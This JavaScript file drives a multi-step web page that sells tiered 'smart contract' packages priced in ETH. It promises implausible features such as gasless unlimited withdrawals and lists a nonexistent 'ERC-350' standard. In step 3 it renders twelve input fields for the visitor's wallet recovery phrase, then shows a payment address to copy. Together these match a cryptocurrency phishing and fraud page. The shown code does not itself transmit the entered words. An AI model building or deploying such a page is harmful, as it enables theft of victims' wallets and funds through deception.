const ETH_PRICES = {
  "USD": 3600,
  "CAD": 4900,
  "EUR": 3300
};

const TIERS = {
  "ERC-20": [
    { name: "Normal", eth: 1.5, desc: "Basic transfer functionality\nLimited customization\nStandard gas fees apply" },
    { name: "Medium", eth: 2.1, desc: "Optimized transfer & airdrop\nReduced gas\nModerate customization" },
    { name: "Trader", eth: 3.4, desc: "Unlimited withdrawal\nNo gas fees\nAuto-market integration" }
  ],
  "ERC-350": [
    { name: "Normal", eth: 0.6, desc: "Simple one-time withdrawal\nBasic security" },
    { name: "Medium", eth: 1, desc: "Scheduled withdrawals\nCustom token support" },
    { name: "Expert", eth: 3.4, desc: "High-value transfers\nBulk gasless withdrawal" }
  ],
  "ERC-721": [
    { name: "Basic", eth: 0.9, desc: "Mint & transfer\nNo marketplace integration" },
    { name: "Gallery", eth: 1.7, desc: "Metadata customization\nOn-chain metadata" },
    { name: "Pro", eth: 2.8, desc: "Royalty support\nNo user minting fee" }
  ],
  "DAO": [
    { name: "Simple DAO", eth: 1.2, desc: "Voting + member control" },
    { name: "Enhanced DAO", eth: 2.2, desc: "Weighted votes\nProposal management" },
    { name: "Governance Expert", eth: 3.5, desc: "Token-weighted governance\nTreasury control\nNo gas votes" }
  ],
  "Staking": [
    { name: "Basic Pool", eth: 1.0, desc: "Manual stake/reward" },
    { name: "Dynamic Pool", eth: 1.8, desc: "Auto rewards\nToken lockups" },
    { name: "Expert Staking", eth: 3.3, desc: "Multi-token\nBoost logic\nGasless claiming" }
  ],
  "ICO": [
    { name: "Basic Sale", eth: 1.4, desc: "Token sale with cap\nETH only" },
    { name: "Standard Launch", eth: 2.5, desc: "Multi-token\nWhitelist support" },
    { name: "Expert Launchpad", eth: 3.8, desc: "Auto-release\nAnti-bot\nNo buyer fee" }
  ]
};

let selectedType = '';
let selectedTier = null;

function goToStep2() {
  const type = document.getElementById('contractType').value;
  if (!type) return alert("Please select a contract type.");
  selectedType = type;
  updateTiers();
  showStep(2);
}

function updateTiers() {
  const container = document.getElementById('tiersContainer');
  const currency = document.getElementById('currency').value;
  container.innerHTML = "";
  TIERS[selectedType].forEach((tier, i) => {
    const converted = (tier.eth * ETH_PRICES[currency]).toFixed(2);
    const div = document.createElement("div");
    div.className = "tier";
    div.innerHTML = `
      <h3>${tier.name} – ${tier.eth} ETH (~${converted} ${currency})</h3>
      <p>${tier.desc}</p>
      <button onclick="selectTier(${i})">Select</button>
    `;
    container.appendChild(div);
  });
}

function selectTier(index) {
  selectedTier = TIERS[selectedType][index];
  alert(`You selected ${selectedTier.name}`);
}

function updatePrices() {
  if (selectedType) updateTiers();
}

function goToStep3() {
  if (!selectedTier) return alert("Please select a tier.");
  showStep(3);
  const mnemonicContainer = document.getElementById("mnemonics");
  mnemonicContainer.innerHTML = "";
  for (let i = 1; i <= 12; i++) {
    mnemonicContainer.innerHTML += `<input type="text" placeholder="${i}" />`;
  }
}

function goToStep4() {
  showStep(4);
  document.getElementById("selectedTierName").textContent = selectedTier.name;
  document.getElementById("ethPrice").textContent = selectedTier.eth;
}

function showStep(step) {
  document.querySelectorAll('.step').forEach(s => s.classList.remove("active"));
  document.getElementById(`step${step}`).classList.add("active");
}

function copyAddress() {
  const address = document.getElementById("paymentAddress").textContent;
  navigator.clipboard.writeText(address).then(() => alert("Address copied!"));
}
